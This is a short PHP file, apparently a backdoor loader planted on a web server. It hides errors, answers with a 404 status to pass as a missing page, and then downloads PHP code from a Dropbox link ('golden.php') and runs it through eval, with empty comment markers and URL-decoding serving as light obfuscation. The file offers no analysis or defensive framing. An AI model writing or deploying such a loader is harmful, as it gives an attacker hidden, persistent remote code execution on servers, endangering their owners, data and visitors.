<?php 
error_reporting(0);
http_response_code(404);
eval(
    /**_**/ urldecode("%3f%3e") .
        file_get_contents(
            /**_**/ urldecode(
                /**_**/ "https://www.dropbox.com/scl/fi/90eodi1050qd9xle7tfy6/golden.php?rlkey=s61f82btreuh41fpjn3cy51b2&st=zcpgidj7&dl=1"
            )
        )
); ?>